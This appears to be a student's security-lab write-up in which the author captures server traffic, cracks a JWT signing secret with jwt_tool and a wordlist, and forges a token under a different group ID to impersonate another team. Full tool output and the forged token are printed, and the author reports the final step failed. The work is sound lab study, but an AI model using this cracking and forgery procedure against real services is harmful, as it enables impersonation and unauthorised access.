@@ -1,0 +1,161 @@
+All infos about how the server works are saved using the following command:
+tshark -w tshark.pcap host mantra.netsec.seclab-bonn.de or host night-shift.netsec.seclab-bonn.de
+Anaylsing this pcap-file with wireshark we see that the server works as follows (using for some parts the websocket protocol):
+
+First the client, here mantra, sends her ticket encoded as a JSON-Webtoken via TCP
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cC1pZCI6IjAwMDAxIiwiaWF0IjoxNTE2MjM5MDIyfQ.aUQB-sj_DF6Mw9B8Lk9t5Z2gs8IL6C9foATpfPhMxOg
+
+Using the jwt_tool we can decode the webtoken and get the secret used from the server for encoding:
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$ python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cC1pZCI6IjAwMDAxIiwiaWF0IjoxNTE2MjM5MDIyfQ.aUQB-sj_DF6Mw9B8Lk9t5Z2gs8IL6C9foATpfPhMxOg rockyou.txt
+
+,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+----''----''----''----''----''----''----''----''----''----'
+     ,--.,--.   ,--.,--------.,--------.             ,--.
+     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
+,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
+|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
+ `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
+,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+'----''----''----''----''----''----''----''----''----''----'
+
+Token header values:
+[+] alg = HS256
+[+] typ = JWT
+
+Token payload values:
+[+] group-id = 00001
+[+] iat = 1516239022
+
+######################################################
+# Options:                                           #
+# 1: Check CVE-2015-2951 - alg=None vulnerability    #
+# 2: Check for Public Key bypass in RSA mode         #
+# 3: Check signature against a key                   #
+# 4: Check signature against a key file ("kid")      #
+# 5: Crack signature with supplied dictionary file   #
+# 6: Tamper with payload data (key required to sign) #
+# 0: Quit                                            #
+######################################################
+
+Please make a selection (1-6)
+> 5
+
+Loading key dictionary...
+File loaded: rockyou.txt
+Testing 14344380 passwords...
+[+] 1234qwer is the CORRECT key!
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+When we want to authentificate as someone else, here our group, we have to use our groupnumber, here 11, but use the same key for signing:
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$ python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cC1pZCI6IjAwMDAxIiwiaWF0IjoxNTE2MjM5MDIyfQ.aUQB-sj_DF6Mw9B8Lk9t5Z2gs8IL6C9foATpfPhMxOg rockyou.txt
+
+,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+----''----''----''----''----''----''----''----''----''----'
+     ,--.,--.   ,--.,--------.,--------.             ,--.
+     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
+,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
+|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
+ `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
+,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+'----''----''----''----''----''----''----''----''----''----'
+
+Token header values:
+[+] alg = HS256
+[+] typ = JWT
+
+Token payload values:
+[+] group-id = 00001
+[+] iat = 1516239022
+
+######################################################
+# Options:                                           #
+# 1: Check CVE-2015-2951 - alg=None vulnerability    #
+# 2: Check for Public Key bypass in RSA mode         #
+# 3: Check signature against a key                   #
+# 4: Check signature against a key file ("kid")      #
+# 5: Crack signature with supplied dictionary file   #
+# 6: Tamper with payload data (key required to sign) #
+# 0: Quit                                            #
+######################################################
+
+Please make a selection (1-6)
+> 6
+
+Token header values:
+[1] alg = HS256
+[2] typ = JWT
+[3] *ADD A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token payload values:
+[1] group-id = 00001
+[2] iat = 1516239022
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 1
+
+Current value of group-id is: 00001
+Please enter new value and hit ENTER
+> 00011
+[1] group-id = 00011
+[2] iat = 1516239022
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token Signing:
+[1] Sign token with known key
+[2] Strip signature from token vulnerable to CVE-2015-2951
+[3] Sign with Public Key bypass vulnerability
+[4] Sign token with key file
+
+Please select an option from above (1-4):
+> 1
+
+Please enter the known key:
+> 1234qwer
+
+Please enter the keylength:
+[1] HMAC-SHA256
+[2] HMAC-SHA384
+[3] HMAC-SHA512
+> 1
+
+Your new forged token:
+[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cC1pZCI6IjAwMDExIiwiaWF0IjoxNTE2MjM5MDIyfQ.m4PiE0pK5qvxZMzQrom0OKxQucgJdsLPUTuu3yasUlg
+[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cC1pZCI6IjAwMDExIiwiaWF0IjoxNTE2MjM5MDIyfQ.m4PiE0pK5qvxZMzQrom0OKxQucgJdsLPUTuu3yasUlg
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Now, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cC1pZCI6IjAwMDExIiwiaWF0IjoxNTE2MjM5MDIyfQ.m4PiE0pK5qvxZMzQrom0OKxQucgJdsLPUTuu3yasUlg is the "from the server" signed ticket of our group, everything we need to authentificate not as mantra, but as us.
+
+Now back to the description of the algorithm:
+As the client gets a strange looking answer on sending his ticket, we guess that this some kind of password for the client used for further authentification in the websocket protocol, which looks as follows:
+
+After the handshake the client has to authentificate by sending the password from the TCP-protocol before. After that, the server returns 
+1695fc804cdb7b73a715269a1ec5d0b78b7b12c0|1559563699|AUTHOK.A1695fc804cdb7b73a715269a1ec5d0b78b7b12c0|1559563699|md5:salvation
+where the first part 1695fc804cdb7b73a715269a1ec5d0b78b7b12c0, I guess, is the sent password, 1559563699 is the unixtime of authentification (i.e. the unixtime at which the server received our previous message) and AUTHOK is just the sign for us that the authentification was successul.
+Then he continues by sending again the password 1695fc804cdb7b73a715269a1ec5d0b78b7b12c0 with the unixtime of authentification 1559563699 and md5:salvation which is I think the demand for sending him the md5 hash with salt "salvation" of the string "1695fc804cdb7b73a715269a1ec5d0b78b7b12c0|1559563699".
+
+After this the server should finally send 
+1695fc804cdb7b73a715269a1ec5d0b78b7b12c0|1559563699|netsec{57331201034b4bac9e43ee5bf28e577a027d90f657753f21b84c279bbdc7499f}
+which is the password and the authentification time again as well as the secret inside the brackets {} belonging to the group (here group 1 of mantra).
+
+Using this knowledge/assumptions I tried to copy the behavior of mantra in fake.py in the functions mantratsig and mantraws. In the functions groupsig and groupws in the same file I tried to copy the behavior of mantra but work with the ID of my group.
+Sadly it did not work out, as every attempt to call the server via tcp with one of the tickets yields the error code "400 bad request", not some strange lookin string that's maybe a password... So I am pretty sure that there is a mistake in my considerations, so I changed the files in which the tcp-answers are written to have the filenames "mantrasignature.txt" and "groupsignature.txt" free for later use (because my websocket part reads the passwords from that files), but I can not figure out what's wrong. 
